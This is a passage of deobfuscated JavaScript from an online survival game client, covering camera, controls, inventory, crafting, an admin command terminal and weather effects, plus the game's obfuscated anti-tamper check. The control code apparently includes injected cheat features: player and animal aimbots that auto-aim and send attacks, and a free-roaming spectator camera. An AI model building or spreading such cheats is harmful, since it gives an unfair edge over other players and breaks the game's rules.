              document.getElementById("shop_starterkit").style.display = "none";
              this.open = false;
            }
          }
        }
      };
      this.totem = {
        id: -1,
        pid: -1,
        lock: 0,
        timeout: new Utils.LinearAnimation(false, 0, 1, 0, 1 / 30, 1),
        wait: false
      };
      this.helmet = {
        timeout: new Utils.LinearAnimation(false, 0, 1, 0, 0.2, 1),
        wait: false
      };
      this.build = {
        timeout: new Utils.LinearAnimation(false, 0, 1, 0, 1, 1),
        wait: false
      };
      this.weapon = {
        timeout: new Utils.LinearAnimation(false, 0, 1, 0, 0.1, 1),
        wait: false
      };
      this.cam = new Utils.Ease2d(Utils.ease_out_quad, 0, 0.4, 0, 0, m, v, m, v);
      this.cam.delay = 0;
      this.cam.forcedDelay = 0;
      this.cam.update = function () {
        if (this.forcedDelay > 0) {
          this.forcedDelay -= I_;
        } else {
          var e = s_.fast_units[__.uid];
          if (e && !r.visuals.spectator.enable) {
            this.delay = 0;
            var i = Math.max(Math.min(m - e.x, -2), 2 - s_.w + S);
            var t = Math.max(Math.min(v - e.y, -2), 2 - s_.h + p);
            this.ease({
              x: i,
              y: t
            });
          } else {
            this.delay += I_;
            if (this.delay > 3) {
              this.delay = 0;
              if (!__.reconnect.enabled) {
                client.get_focus();
              }
            }
          }
        }
      };
      this.cam.w = screen.width * 1.4;
      this.cam.h = screen.height * 1.4;
      this.cam.rw = this.cam.w;
      this.cam.rh = this.cam.h;
      this.cam.rx = 0;
      this.cam.ry = 0;
      this.cam.rdw = 0;
      this.cam.rdh = 0;
      this.cam.change = function (e, i) {
        this.x = -Math.min(Math.max(-s_.dw * 2, e - s_.dw - this.rw / 2), s_.w - this.rw);
        this.y = -Math.min(Math.max(-s_.dh * 2, i - (s_.dh + this.rh) / 2), s_.h - this.rh + s_.dh);
        this.ex = this.x;
        this.ey = this.y;
      };
      this.control = {
        angle: 0,
        timeout: 0,
        aim_timeout: 0,
        previous: 0,
        mouse: 0,
        attack: 0,
        update: function () {
          var e = s_.fast_units[__.uid];
          let i = s_.units[us.PLAYERS];
          let n = [s_.units[us.RABBIT], s_.units[us.PENGUIN], s_.units[us.SPIDER], s_.units[us.CRAB], s_.units[us.HAWK], s_.units[us.BABY_MAMMOTH], s_.units[us.KRAKEN], s_.units[us.WOLF], s_.units[us.PIRANHA], s_.units[us.FOX], s_.units[us.BOAR], s_.units[us.FLAME], s_.units[us.VULTURE], s_.units[us.BEAR], s_.units[us.BABY_DRAGON], s_.units[us.MAMMOTH], s_.units[us.LAVA_DRAGON], s_.units[us.DRAGON], s_.units[us.BABY_LAVA], s_.units[us.CRAB_BOSS], s_.units[us.SAND_WORM]];
          let a = [];
          n.forEach(e => {
            e.forEach(e => {
              a.push(e);
            });
          });
          if (e) {
            var o = {
              x: __.cam.x + e.x,
              y: __.cam.y + e.y
            };
          } else {
            o = M;
          }
          var s = Utils.get_std_angle(h_.pos, o);
          if (r.main.aimbot.player && e) {
            let r = t.findTarget(i);
            if (r.distance < t.weaponRange(e.right)) {
              this.aim_timeout += I_;
              s = Utils.get_std_angle({
                x: r.entity.r.x + __.cam.x,
                y: r.entity.y + __.cam.y
              }, {
                x: e.r.x + __.cam.x,
                y: e.r.y + __.cam.y
              });
              if (this.aim_timeout > As.ATTACK) {
                this.aim_timeout = 0;
                client.send_attack(s);
              }
            } else if (this.aim_timeout > 0) {
              this.aim_timeout = 0;
              client.stop_attack();
            }
          }
          if (r.main.aimbot.animal && e) {
            let i = t.findTarget(a);
            if (i.distance < t.weaponRange(e.right)) {
              this.aim_timeout += I_;
              s = Utils.get_std_angle({
                x: i.entity.r.x + __.cam.x,
                y: i.entity.y + __.cam.y
              }, {
                x: e.r.x + __.cam.x,
                y: e.r.y + __.cam.y
              });
              if (this.aim_timeout > As.ATTACK) {
                this.aim_timeout = 0;
                client.send_attack(s);
              }
            } else if (this.aim_timeout > 0) {
              this.aim_timeout = 0;
              client.stop_attack();
            }
          }
          var _ = false;
          this.mouse += I_;
          if (!h_.state) {
            if (e && !(e.action & Es.ATTACK) && this.mouse > As.ATTACK) {
              this.attack = 1;
              _ = true;
              this.mouse = 0;
              client.send_attack(s);
            }
          }
          if (e) {
            e.angle = s;
            e.nangle = s;
          }
          if (!_) {
            this.timeout += I_;
            if (this.timeout > As.ROTATE) {
              this.timeout = 0;
              if (Math.abs(this.angle - s) > 0.005) {
                client.send_angle(s);
                this.angle = s;
              }
            }
          }
          if (!__.chat.open && !__.terminal.open) {
            var E = 0;
            if (d_.is_left()) {
              E |= 1;
            }
            if (d_.is_right()) {
              E |= 2;
            }
            if (d_.is_bottom()) {
              E |= 4;
            }
            if (d_.is_top()) {
              E |= 8;
            }
            if (r.visuals.spectator.enable) {
              switch (E) {
                case 1:
                  __.cam.x += r.visuals.spectator.speed;
                  break;
                case 2:
                  __.cam.x -= r.visuals.spectator.speed;
                  break;
                case 4:
                  __.cam.y -= r.visuals.spectator.speed;
                  break;
                case 5:
                  __.cam.x += r.visuals.spectator.speed;
                  __.cam.y -= r.visuals.spectator.speed;
                  break;
                case 6:
                  __.cam.x -= r.visuals.spectator.speed;
                  __.cam.y -= r.visuals.spectator.speed;
                  break;
                case 8:
                  __.cam.y += r.visuals.spectator.speed;
                  break;
                case 9:
                  __.cam.x += r.visuals.spectator.speed;
                  __.cam.y += r.visuals.spectator.speed;
                  break;
                case 10:
                  __.cam.x -= r.visuals.spectator.speed;
                  __.cam.y += r.visuals.spectator.speed;
              }
            }
            if (this.previous != E) {
              client.send_move(E);
            }
            this.previous = E;
          }
        }
      };
      this.gauges = {
        c: 1,
        l: 1,
        h: 1,
        t: 1,
        o: 1,
        wa: 1,
        warn_cold: new Utils.LinearAnimation(true, 0, 1, 0, 3, 3),
        warn_life: new Utils.LinearAnimation(true, 0, 1, 0, 2, 2),
        warn_hunger: new Utils.LinearAnimation(true, 0, 1, 0, 3, 3),
        warn_thirst: new Utils.LinearAnimation(true, 0, 1, 0, 3, 3),
        warn_oxygen: new Utils.LinearAnimation(true, 0, 1, 0, 3, 3),
        warn_warm: new Utils.LinearAnimation(true, 0, 1, 0, 3, 3),
        cold: new Utils.Ease(Utils.ease_out_quad, 0, 1, 0, 0, 1),
        life: new Utils.Ease(Utils.ease_out_quad, 0, 1, 0, 0, 1),
        hunger: new Utils.Ease(Utils.ease_out_quad, 0, 1, 0, 0, 1),
        thirst: new Utils.Ease(Utils.ease_out_quad, 0, 1, 0, 0, 1),
        oxygen: new Utils.Ease(Utils.ease_out_quad, 0, 1, 0, 0, 1),
        warm: new Utils.Ease(Utils.ease_out_quad, 0, 1, 0, 0, 1),
        update: function () {
          this.warn_cold.update();
          this.warn_life.update();
          this.warn_hunger.update();
          this.warn_thirst.update();
          this.warn_oxygen.update();
          this.warn_warm.update();
          this.cold.ease(this.c);
          this.life.ease(this.l);
          this.hunger.ease(this.h);
          this.thirst.ease(this.t);
          this.oxygen.ease(this.o);
          this.warm.ease(this.wa);
        }
      };
      this.bigmap = false;
      this.spectator = false;
      this.zombie = false;
      this.vampire = false;
      this.inv = {
        max: ds.WITHOUT_BAG,
        bonus: 0,
        bag: 0,
        n: [],
        can_select: [],
        update_bag_size: function (e, i) {
          if (e === 1) {
            this.bag = ds.BAG_SIZE;
          }
          this.bonus += i;
          this.max = ds.WITHOUT_BAG + this.bonus + this.bag;
        },
        drag: {
          item: -1,
          img: null,
          _start: 0,
          _move: 0,
          _x: -1,
          _y: -1,
          move: function (e) {
            if (!(!this._start || e.x === this._x && e.y === this._y)) {
              this._move = 1;
            }
          },
          start: function (e, i) {
            this._x = i.x;
            this._y = i.y;
            this.item = e;
            this.img = __.inv.can_select[e].info.img[2];
            this._start = 1;
          },
          stop: function () {
            this._start = 0;
            this._move = 0;
            this._x = -1;
            this._y = -1;
          },
          release: function () {
            var e = -1;
            var i = __.inv.can_select;
            var t = 0;
            if (this._start && this._move) {
              for (var r = 0; r < i.length; r++) {
                if (i[r].info.state === $o) {
                  e = r;
                  break;
                }
              }
              if (e !== -1 && e !== this.item && i[this.item]) {
                t = 1;
                var n = i[e];
                i[e] = i[this.item];
                i[this.item] = n;
                T_.update_inv_buttons();
              }
            }
            this.stop();
            return t;
          },
          draw: function (e, i) {
            if (this._start && this._move) {
              Nn(D, this.img, Math.floor(e - this.img.width / 2), Math.floor(i - this.img.height / 2));
            }
          }
        },
        free_place: function (e) {
          for (n = 0; n < e.length; n++) {
            if (this.n[e[n][0]] == e[n][1]) {
              return true;
            }
          }
          return false;
        },
        find_item: function (e) {
          for (var i = 0; i < this.can_select.length; i++) {
            if (this.can_select[i].id == e) {
              return i;
            }
          }
          return -1;
        },
        delete_item: function (e, i) {
          this.n[e] = 0;
          this.can_select.splice(i, 1);
          T_.update_inv_buttons();
        },
        decrease: function (e, i, t) {
          update = true;
          this.n[e] = Math.max(0, this.n[e] - i);
          if (!this.n[e] && t >= 0) {
            this.delete_item(e, t);
          }
        }
      };
      this.show_spectators = {
        enabled: false,
        translate: {
          x: 0,
          y: 0
        },
        invert: function () {
          if (!(s_.mode != ds.MODE_HUNGER_GAMES || __.spectator)) {
            __.show_spectators.enabled = !__.show_spectators.enabled;
            if (__.show_spectators.enabled) {
              T_.options.spectator_agree.display = "inline-block";
            } else {
              T_.options.spectator_agree.display = "none";
            }
          }
        }
      };
      T_.options.spectator_agree.display = "none";
      this.auto_feed = {
        enabled: false,
        translate: {
          x: 0,
          y: 0
        },
        delay: 0,
        invert: function () {
          __.auto_feed.enabled = !__.auto_feed.enabled;
          if (__.auto_feed.enabled) {
            T_.options.feed_agree.display = "inline-block";
          } else {
            T_.options.feed_agree.display = "none";
          }
        },
        update: function () {
          if (!(!this.enabled || __.craft.id >= 0 || T_.safe_delete.open)) {
            this.delay += I_;
            if (this.delay > 2) {
              this.delay = 0;
              if (__.gauges.h < 0.35) {
                if (__.inv.n[le.PLANT]) {
                  client.select_inv(le.PLANT, __.inv.find_item(le.PLANT));
                } else if (__.inv.n[le.GARLIC]) {
                  client.select_inv(le.GARLIC, __.inv.find_item(le.GARLIC));
                } else if (__.inv.n[le.CRAB_STICK]) {
                  client.select_inv(le.CRAB_STICK, __.inv.find_item(le.CRAB_STICK));
                } else if (__.inv.n[le.PUMPKIN]) {
                  client.select_inv(le.PUMPKIN, __.inv.find_item(le.PUMPKIN));
                } else if (__.inv.n[le.TOMATO]) {
                  client.select_inv(le.TOMATO, __.inv.find_item(le.TOMATO));
                } else if (__.inv.n[le.CARROT]) {
                  client.select_inv(le.CARROT, __.inv.find_item(le.CARROT));
                } else if (__.inv.n[le.WATERMELON]) {
                  client.select_inv(le.WATERMELON, __.inv.find_item(le.WATERMELON));
                } else if (__.inv.n[le.BREAD]) {
                  client.select_inv(le.BREAD, __.inv.find_item(le.BREAD));
                } else if (__.inv.n[le.COOKED_MEAT]) {
                  client.select_inv(le.COOKED_MEAT, __.inv.find_item(le.COOKED_MEAT));
                } else if (__.inv.n[le.FOODFISH_COOKED]) {
                  client.select_inv(le.FOODFISH_COOKED, __.inv.find_item(le.FOODFISH_COOKED));
                } else if (__.inv.n[le.COOKIE]) {
                  client.select_inv(le.COOKIE, __.inv.find_item(le.COOKIE));
                } else if (__.inv.n[le.SANDWICH]) {
                  client.select_inv(le.SANDWICH, __.inv.find_item(le.SANDWICH));
                } else if (__.inv.n[le.CAKE]) {
                  client.select_inv(le.CAKE, __.inv.find_item(le.CAKE));
                } else if (__.inv.n[le.CRAB_LOOT]) {
                  client.select_inv(le.CRAB_LOOT, __.inv.find_item(le.CRAB_LOOT));
                }
              } else if (__.gauges.t < 0.35 && __.inv.n[le.BOTTLE_FULL]) {
                client.select_inv(le.BOTTLE_FULL, __.inv.find_item(le.BOTTLE_FULL));
              }
            }
          }
        }
      };
      T_.options.feed_agree.display = "none";
      this.craft = {
        id: -1,
        id2: -1,
        timeout: new Utils.LinearAnimation(false, 0, 1, 0, 1, 1),
        crafting: false,
        preview: -1,
        mode: 0,
        label: [],
        can_craft: [],
        workbench: false,
        fire: false,
        water: false,
        well: false,
        change_mode: function () {
          this.mode = this.mode === 0 ? 1 : 0;
        },
        set_workbench: function (e) {
          this.workbench = e;
          var i = T_.safe_delete;
          if (i.open) {
            i.del(i.button);
          }
          this.update();
        },
        do_recycle: function (e) {
          var i = ge[e];
          this.id = e;
          this.crafting = true;
          s_.fast_units[__.uid];
          this.timeout.max_speed = i.time * 8;
          this.id2 = i.id2;
        },
        do_craft: function (e) {
          var i = ge[e];
          this.id = e;
          this.crafting = true;
          var t = s_.fast_units[__.uid];
          if (t && t.right == le.BOOK) {
            this.timeout.max_speed = i.time * 3;
          } else {
            this.timeout.max_speed = i.time;
          }
          this.id2 = i.id2;
          for (var r = 0; r < i.r.length; r++) {
            var n = i.r[r];
            __.inv.decrease(n[0], n[1], __.inv.find_item(n[0]));
          }
          T_.update_inv_buttons();
        },
        update: function () {
          this.can_craft = [];
          if (T_.info_box.craft === 1) {
            T_.info_box.display = 0;
          }
          for (var e in ge) {
            var i = ge[e];
            var t = true;
            if (i.r) {
              for (var r = 0; r < i.r.length; r++) {
                if (__.inv.max >= ds.WITH_BAG && i.id === ue.BAG) {
                  t = false;
                  break;
                }
                if (i.w > this.workbench || i.f > this.fire || i.o > this.water || i.e > this.well) {
                  t = false;
                  break;
                }
                var n = i.r[r];
                if (!__.inv.n[n[0]] || __.inv.n[n[0]] < n[1]) {
                  t = false;
                  break;
                }
              }
              if (t) {
                this.can_craft.push(T_.craft_buttons[i.id]);
              }
            }
          }
          T_.update_craft_buttons();
          T_.update_chest_buttons();
          T_.update_furnace_button();
          T_.update_windmill_button();
          T_.update_extractor_button();
          T_.update_bread_oven_button();
          T_.sign.update_button();
        },
        restart: function () {
          this.id = -1;
          this.crafting = false;
          this.timeout.v = 0;
          this.timeout.o = false;
          this.update();
        }
      };
      this.welcome = {
        message: undefined,
        draw: Io
      };
      this.alert = {
        timeout: new Utils.LinearAnimation(false, 1, 1, 0, 4, 0.3),
        text: "",
        label: null,
        draw: uo,
        list: []
      };
      this.ldb = {
        can: document.createElement("canvas"),
        ids: [],
        update: true,
        translate: {
          x: 0,
          y: 0
        },
        sort: function () {
          for (var e = [], i = s_.players, t = 0; t < i.length; t++) {
            if (i[t].alive) {
              e.push({
                id: t,
                s: i[t].score
              });
            }
          }
          e.sort(function (e, i) {
            return i.s - e.s;
          });
          this.ids = [];
          for (t = 0; t < e.length && t < 10; t++) {
            this.ids.push(e[t].id);
          }
          this.update = true;
        },
        init: function (e) {
          var i = s_.players;
          i[__.id].score = Utils.restore_number(e[1]);
          this.ids = [];
          for (var t = 2; t < e.length; t += 2) {
            this.ids.push(e[t]);
            i[e[t]].score = Utils.restore_number(e[t + 1]);
          }
          this.update = true;
        }
      };
      this.ldb.can.width = L * 180;
      this.ldb.can.height = L * 300;
      this.ldb.ctx = this.ldb.can.getContext("2d");
      this.terminal = {
        open: false,
        input: document.getElementById("commandInput"),
        contentBox: document.getElementById("commandsBox"),
        style: document.getElementById("commandMainBox").style,
        _print: function (e) {
          this.contentBox.innerHTML += e;
        },
        update: function () {
          this.style.left = Math.floor(S / 2 - 300) + "px";
          this.style.top = Math.floor(p / 2 - 250) + "px";
        },
        _clean: function () {
          this.contentBox.innerHTML = "";
        },
        quit: function () {
          this.open = false;
          this.style.display = "none";
        },
        create_array: function (e) {
          for (var i = "<table class=\"tableList\">", t = 0; t < e.length; t++) {
            if (t % 3 == 0) {
              i += "<tr>";
            }
            i += "<td class=\"tableList\">" + e[t] + "</td>";
            if (!((t + 1) % 3 != 0 && t + 1 !== e.length)) {
              i += "</tr>";
            }
          }
          return i += "</table>";
        },
        write_command: function (e, i, t, r) {
          var n = "<div class=commandWritten>" + (e = e || "");
          n += (i = i || "") ? "<div class=commandValidated>" : "<div class=commandUnknown>";
          n += (t = t || "") + "</div>" + (r = r || "") + "</div>";
          this._print(n);
          this.scroll_down();
        },
        scroll_down: function () {
          this.contentBox.scrollTop = this.contentBox.scrollHeight;
        },
        commands: function (e) {
          switch (e) {
            case "clean":
              this._clean();
              return true;
            case "list":
              for (var i = "", t = s_.players, r = 0; r < t.length; r++) {
                var n = t[r];
                if (n.alive) {
                  i += n.nickname + " <br /><span style=\"color:green\">#" + r + "</span> <span style=\"color:gold\">#" + n.level + "</span> ";
                }
              }
              this.write_command("list", 1, "List all connected players", i);
              return true;
            case "weapon-list":
              this.write_command("Weapons", 1, "List all weapons in the game", this.create_array(["sword_wood", "sword", "sword_gold", "sword_diamond", "sword_amethyst", "sword_reidite", "dragon_sword", "lava_sword", "sword_pirate", "wood_spear", "spear", "gold_spear", "diamond_spear", "amethyst_spear", "reidite_spear", "dragon_spear", "lava_spear", "crab_spear", "wood_bow", "wood_arrow"]));
              return true;
            case "tool-list":
              this.write_command("Tools", 1, "List all tools in the game", this.create_array(["pick_wood", "pick", "pick_gold", "pick_diamond", "pick_amethyst", "pick_reidite", "hammer", "hammer_gold", "hammer_diamond", "hammer_amethyst", "hammer_reidite", "super_hammer", "shovel", "shovel_gold", "shovel_diamond", "shovel_amethyst", "pitchfork", "pitchfork2", "spanner", "book"]));
              return true;
            case "survival-list":
              this.write_command("Survival Items", 1, "List all survival items in the game", this.create_array(["fire", "workbench", "bandage", "big_fire", "furnace", "paper", "blue_cord", "lock", "lockpick", "totem", "resurrection", "bridge", "bottle_full", "bottle_empty", "watering_can", "watering_can_full", "windmill", "plot", "bread_oven", "chest", "bucket_empty", "bucket_full", "well", "sign", "roof", "bed", "boat", "sled", "boar", "saddle", "emerald_machine", "extractor_stone", "extractor_gold", "extractor_diamond", "extractor_amethyst", "extractor_reidite_button"]));
              return true;
            case "resource-list":
              this.write_command("Resources", 1, "List all resources in the game", this.create_array(["wood", "stone", "gold", "diamond", "amethyst", "reidite", "fur", "fur_wolf", "fur_winter", "cord", "scales", "penguin_feather", "flame", "sand", "ground", "ice", "dragon_heart", "lava_heart", "kraken_skin", "special_fur", "special_fur_2", "gemme_green", "gemme_orange", "gemme_blue", "dragon_cube", "dragon_orb", "lava_cube", "lava_orb", "fur_boar", "pitchfork_part", "pilot_glasses", "fur_mammoth"]));
              return true;
            case "food-list":
              this.write_command("Food", 1, "List all food in the game", this.create_array(["plant", "seed", "meat", "cooked_meat", "flour", "wheat_seed", "cookies", "wild_wheat", "cake", "fish", "cooked_fish", "bread", "sandwich", "pumpkin_seed", "pumpkin", "garlic_seed", "garlic", "thornbush_seed", "thornbush", "crab_stick", "claw", "carrot_seed", "carrot", "tomato_seed", "tomato", "watermelon_seed", "watermelon", "aloe_vera_seed", "aloe_vera", "cactus"]));
              return true;
            case "hat-list":
              this.write_command("Hats", 1, "List all hats in the game", this.create_array(["earmuffs", "coat", "scarf", "fur_hat", "warm_protection", "warm_protection2", "warm_protection3", "explorer_hat", "pirate_hat", "wood_helmet", "stone_helmet", "gold_helmet", "diamond_helmet", "amethyst_helmet", "reidite_helmet", "dragon_helmet", "lava_helmet", "crab_helmet", "diving_mask", "super_diving_suit", "crown_green", "crown_orange", "crown_blue", "hood", "peasant", "winter_hood", "winter_peasant", "bag", "turban1", "turban2", "pilot_hat"]));
              return true;
            case "building-list":
              this.write_command("Buildings", 1, "List all buildings in the game", this.create_array(["wall", "stone_wall", "gold_wall", "diamond_wall", "amethyst_wall", "reidite_wall", "spike", "stone_spike", "gold_spike", "diamond_spike", "amethyst_spike", "reidite_spike", "wood_door", "stone_door", "gold_door", "diamond_door", "amethyst_door", "reidite_door", "wood_spike_door", "stone_spike_door", "gold_spike_door", "diamond_spike_door", "amethyst_spike_door", "reidite_spike_door"]));
              return true;
            case "biome-list":
              this.write_command("Biomes list", 1, "List all available biomes in the game", this.create_array(["forest", "winter", "lava", "sea", "beach", "island", "dragon"]));
              return true;
            case "help-config":
              this.write_command("Help Configuration", 1, "Learn how to build your customized map", "<div class=\"specialCommandBox\">To get the current map configuration, and modify it, copy the result of <span class=\"commandSynthax\">get-config</span> in a text file and change every parameter you want.</div>To modify the settings, change a number to another with <span class=\"commandSynthax\">set-config</span></br>To modify the map, modify \"important\" section (at the end)<div class=\"infoCommand\">The minimum size of the map is 50x50.</div>\"custom_map\" is used to change the biomes and is written like this :<div class=\"commandSynthax\" style=\"font-size:17px;\">\"custom_map\":[[\"biome\",width,height],...,[\"biome\",width,height]]</div>Biomes are <span class=\"commandSynthax\">\"forest\"</span>, <span class=\"commandSynthax\">\"lava\"</span>, <span class=\"commandSynthax\">\"winter\"</span>, and <span class=\"commandSynthax\">\"dragon\"</span>.");
              return true;
            case "pos":
              t = s_.units[us.PLAYERS];
              r = 0;
              for (; r < t.length; r++) {
                var a = t[r];
                if (a.pid === __.id) {
                  this.write_command("pos", 1, "Your position is " + Math.floor(a.x / 100) + ":" + Math.floor(a.y / 100));
                  return true;
                }
              }
              break;
            case "help-admin":
              this.write_command("help-admin", 1, "List all available commands for admin only", this.create_array(["restart", "m | message", "mt | message-to", "w | welcome", "name", "password", "k | kick", "b | ban", "tp | teleport", "tpa | teleport-all", "tpt | teleport-to", "pos", "heal", "cancel-craft", "da | disable-attack", "pvp | disable-pvp", "dgs | disable-gather-score", "drs | disable-resource", "dms | disable-mob-safety", "ds | disable-shop", "dn | disable-nickname", "dch | disable-chat", "dq | disable-quest", "dd | disable-drop", "ddc | disable-drop-crate", "db | disable-crate", "dwg | disable-warm-gauge", "dk | disable-kit", "dc | disable-craft", "dr | disable-recycling", "disable-clock", "disable-recipes-book", "disable-market", "sb | spawn-building", "fsb | force-spawn-building", "sch | spawn-chest", "spawn-area", "spawn-area-team", "cl | clean-position", "cba | clean-building-all", "ci | clean-inventory", "cia | clean-inventory-all", "harvest", "gs | give-score", "gsa | give-score-all", "rs | reset-score", "rk | reset-kill", "gm | godmode", "instant-craft", "ka | kill-animals", "g | give", "ga | give-to-all", "ri | remove-item", "ria | remove-item-all", "spawn-location", "tm | team-mode", "default-nickname", "mm | murder-mode", "br | battle-royale", "help-config", "gc | get-config", "sc | set-config", "reset-config", "save-config", "reset-event-time"]));
              return true;
            case "help":
              this.write_command("help", 1, "List all available commands", this.create_array(["clean", "list", "pos", "help-admin", "help", "weapon-list", "tool-list", "survival-list", "resource-list", "food-list", "hat-list", "building-list", "biome-list"]));
              return true;
          }
          return false;
        },
        _open: function () {
          if (!this.open) {
            this.open = true;
            this.style.display = "inline-block";
            this.input.focus();
          }
        },
        _send: function () {
          var e = this.input.value;
          if (e && e.length > 0) {
            if (!this.commands(e)) {
              client.send_command(this.input.value);
            }
            this.input.value = "";
          }
        }
      };
      this.chat = {
        open: false,
        input: document.getElementById("chat_input"),
        style: document.getElementById("chat_block").style,
        update: function () {
          this.style.left = Math.floor(S / 2 - 150) + "px";
          this.style.top = Math.floor(p / 2 + 80) + "px";
        },
        quit: function () {
          this.open = false;
          this.style.display = "none";
          this.input.value = "";
        },
        prefix: "!",
        cmd: {
          hud: function (e) {
            if (e === "off") {
              var i = "Enter \"!hud\" without the quotes to restore the HUD";
              if (__.alert.text) {
                __.alert.list.push(i);
              } else {
                __.alert.text = i;
              }
              T_.show_ui = 0;
            } else {
              T_.show_ui = 1;
            }
          }
        },
        commands: function (e) {
          if (e.charAt(0) == this.prefix) {
            for (var i = "", t = "", r = 1; r < e.length && e.charAt(r) != " "; r++) {
              i += e.charAt(r);
            }
            for (r++; r < e.length; r++) {
              t += e.charAt(r);
            }
            var n = this.cmd[i];
            if (n) {
              n(t);
            }
            return true;
          }
          return false;
        },
        run: function () {
          if (this.open) {
            this.open = false;
            this.style.display = "none";
            var e = this.input.value;
            if (e) {
              if (!this.commands(e)) {
                client.send_chat(this.input.value);
              }
              this.input.value = "";
            }
          } else {
            this.open = true;
            this.style.display = "inline-block";
            this.input.focus();
          }
        }
      };
      this.ash = {
        flakes: [],
        update: function (e) {
          e.y += I_ * 80 * e.s;
          e.x += I_ * 80 * e.c;
          e.life -= I_ / 6;
          if (e.life > 0.2) {
            e.alpha = Math.min(e.alpha + I_ * 3, 1);
          } else {
            e.alpha = Math.max(e.alpha - I_ * 1, 0);
          }
        },
        add: function (e) {
          var i = Math.floor(Math.min(Ie.ASHES_NUMBER * (S / 1366), Ie.ASHES_NUMBER + 10) * Math.max(Math.min(s_.dist_lava + 1000, 3000) / 3000, 0));
          if (this.flakes.length < i) {
            var t = Math.floor(Math.random() * Ie.ASHES_SIZES);
            var r = -__.cam.x + Math.floor(Math.random() * __.cam.w);
            var n = -__.cam.y + Math.floor(Math.random() * __.cam.h);
            var a = Math.random(Math.PI);
            this.flakes.push(new gs(t, r, n, a));
          }
        }
      };
      this.blizzard = 0;
      this.bandage = 0;
      this.desert = {
        flakes: [],
        tempest: 0,
        tempest_speed: 0,
        update: function (e) {
          e.y += I_ * (200 + this.tempest_speed * 800) * e.s;
          e.x += I_ * (200 + this.tempest_speed * 800) * e.c;
          e.life -= I_ / 6;
          if (e.life > 0.2) {
            e.alpha = Math.min(e.alpha + I_ * 3, 1);
          } else {
            e.alpha = Math.max(e.alpha - I_ * 1, 0);
          }
        },
        add: function (e) {
          var i = Math.floor(Math.min((this.tempest_speed + 0.1) * Ie.SAND_NUMBER * (S / 1366), (this.tempest_speed + 0.1) * Ie.SAND_NUMBER + 10) * Math.max(Math.min(s_.dist_desert + 1000, 3000) / 3000, 0));
          if (this.flakes.length < i) {
            var t = Math.floor(Math.random() * Ie.ASHES_SIZES);
            var r = -__.cam.x + Math.floor(Math.random() * __.cam.w);
            var n = -__.cam.y + Math.floor(Math.random() * __.cam.h);
            var a = Math.random(Math.PI);
            if (__.desert.tempest !== 0) {
              r -= __.cam.w / 2;
            }
            this.flakes.push(new gs(t, r, n, a));
          }
        }
      };
      this.winter = {
        flakes: [],
        tempest: 0,
        tempest_speed: 0,
        update: function (e) {
          if (d_.is_bottom()) {
            e.y += I_ * e.speed * (5.5 + this.tempest_speed * 10);
          } else {
            e.y += I_ * e.speed * (5 + this.tempest_speed * 10);
          }
          e.life -= I_ / 2;
          if (d_.is_left()) {
            e.x += I_ * (100 + this.tempest_speed * 400);
          } else if (d_.is_right()) {
            e.x -= I_ * (130 - this.tempest_speed * 400);
          } else {
            e.x -= I_ * (30 - this.tempest_speed * 400);
          }
          if (e.life > 0.2) {
            e.alpha = Math.min(e.alpha + I_ * 3, 1);
          } else {
            e.alpha = Math.max(e.alpha - I_ * 5, 0);
          }
        },
        add: function (e) {
          var i = Math.floor(Math.min((this.tempest_speed * 1.5 + 0.5) * Ie.FLAKES_NUMBER * (S / 1366), (this.tempest_speed * 1.5 + 0.5) * Ie.FLAKES_NUMBER + 10) * Math.max(Math.min(s_.dist_winter + 1000, 3000) / 3000, 0));
          if (this.flakes.length < i) {
            var t = Math.floor(Math.random() * Ie.FLAKES_SIZES);
            var r = -__.cam.x + Math.floor(Math.random() * __.cam.w);
            var n = -__.cam.y + Math.floor(Math.random() * 400 * L - L * 200);
            this.flakes.push(new gs(t, r, n, 0));
          }
        }
      };
      this.beach = [];
      for (var n = 0; n < 4; n++) {
        this.beach.push(new i());
      }
    }
    function Ns() {
      Math.random();
      return "e";
    }
    function bs() {
      Math.random();
      return "t";
    }
    function Ds() {
      Math.random();
      return "d";
    }
    function Ss() {
      Math.random();
      return "o";
    }
    function ps() {
      Math.random();
      return "r";
    }
    function ms() {
      Math.random();
      return "a";
    }
    function ms() {
      Math.random();
      return "a";
    }
    function vs() {
      Math.random();
      return "s";
    }
    function Ms() {
      Math.random();
      return "n";
    }
    function Ls() {
      Math.random();
      return "p";
    }
    function Gs() {
      Math.random();
      return "g";
    }
    function Ss() {
      Math.random();
      return "o";
    }
    function bs() {
      Math.random();
      return "t";
    }
    function Ls() {
      Math.random();
      return "p";
    }
    function fs() {
      Math.random();
      return "i";
    }
    function Hs() {
      Math.random();
      return "C";
    }
    mycyph1 = 1;
    setTimeout(function e() {
      var i = Ms() + ms() + bs() + fs();
      Math.random();
      var t = "W" + Ns() + (Math.random(), "b") + (Math.random(), "S") + Ss() + (Math.random(), "c") + (Math.random(), "k") + Ns() + bs();
      if (window[t].toString().indexOf(i) === -1) {
        Math.floor = function () {
          return Math.round() + 1;
        };
      }
      var r = vs() + Ns() + Ms() + Ds();
      var n = Ls() + ps() + Ss() + bs() + Ss() + bs() + (Math.random(), "y") + Ls() + Ns();
      if (window[t][n][r].toString().indexOf(i) === -1) {
        Math.floor = function () {
          return Math.round() + 1;
        };
      }
      t = Ds() + ps() + ms() + (Math.random(), "w") + (Math.random(), "I") + (Math.random(), "m") + ms() + Gs() + Ns();
      r = Hs() + ms() + Ms() + (Math.random(), "v") + ms() + vs() + (Math.random(), "R") + Ns() + Ms() + Ds() + Ns() + ps() + fs() + Ms() + Gs() + Hs() + Ss() + Ms() + bs() + Ns() + (Math.random(), "x") + bs() + (Math.random(), "2") + (Math.random(), "D");
      if (window[r][n][t].toString().indexOf(i) === -1) {
        Math.floor = function () {
          return Math.round() + 1;
        };
      }
      setTimeout(e, 100000);
    }, 100000);
    n.DEV;
    function Ps(e, i) {
      this.can = e;
      this.ctx = i;
      if (window.navigator.userAgent.indexOf("Edge") > -1) {
        this.cursor0 = "default";
        this.cursor1 = "pointer";
      } else {
        this.cursor0 = "url('img/cursor0.png'), default";
        this.cursor1 = "url('img/cursor1.png'), pointer";
      }
      var t = this;
      function r(e, i, r, n, a) {
        for (var o = this, s = i + 9, _ = 0, E = n, T = i; T < s; T++) {
          t.buttons[T].info.callback = d;
          t.buttons[T].info.cosmeticType = e;
        }
        function A() {
          var i = e[E];
          n_.cosmetic_name = ts(i.name, 0, "#EFE4B4", 30, 350, undefined, 10, 8);
          if (i.level !== undefined) {
            n_.cosmetic_author = ts("Level " + i.level, 0, "#EFE4B4", 30, 250, undefined, 10, 8);
          } else {
